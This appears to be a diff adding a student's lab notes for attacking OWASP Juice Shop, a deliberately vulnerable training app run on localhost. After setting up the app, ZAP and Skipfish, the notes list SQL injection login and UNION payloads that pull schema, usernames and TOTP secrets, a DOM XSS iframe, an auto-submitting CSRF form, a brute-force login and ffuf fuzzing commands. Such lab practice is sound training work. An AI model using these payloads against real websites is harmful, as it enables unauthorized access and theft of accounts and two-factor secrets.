@@ -1,0 +1,96 @@
+# Task 1:
+# Part 1: Environment Setup -- Installing OWASP Juice Shop
+sudo apt update
+sudo apt upgrade
+
+sudo apt install nodejs
+sudo apt install npm
+sudo git clone https://github.com/juice-shop/juice-shop.git
+ls
+
+cd juice-shop
+npm install
+npm start
+
+
+# Part 2: Information Gathering
+# Installing OWASP ZAP
+cd Downloads
+sudo chmod 0+x ZAP_2_16_1_unix.sh
+sudo ./ZAP_2_16_1_unix.sh
+
+
+# Running Skipfish
+skipfish -h
+skipfish -o file01 http://localhost:3000/
+ls
+cd file01
+
+
+# Part 3: Vulnerability Exploitation
+
+# Payload for SQL Injection
+{"email ":"'or 1=1 --","password":"HELLO"}
+
+
+# Cross-Site Scripting (xss)
+# DOM-based XSS -- JavaScript
+<iframe src="javascript:alert(`xss`)">
+
+# Authentication Bypass -- SQL command 
+apple'))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
+
+# Authentication Bypass -- SQL command totpSecret
+apple'))%20UNION%20SELECT%20username,email,totpSecret,4,5,6,7,8,9%20FROM%20Users--
+
+
+# Cross-Site Request Forgery (CSRF)
+# HTML
+<html>
+   <body>
+	<form action="http://localhost:3000/profile" method="POST" id="csrfForm">
+	  <input type="hidden" name="username" value="hacked">
+	</form>
+
+	<script>
+	  document.getElementById('csrfForm').submit();
+	</script>
+    </body>
+</html>
+
+# Python host file
+python3 -m http.server 8080
+
+
+# Part 4: Post-Exploitation
+# Privilege Escalation
+# Brute-Force Attack Payload
+{"email ":"admin@juice-sh.op","password":"test"}
+
+
+
+# Extraction of Sensitive Information
+# Log file
+ffuf -w /usr/share/wordlists/dirb/common.txt -u localhost:300/support/FUZZ 
+
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost:3000/support/FUZZ -fs 80117
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
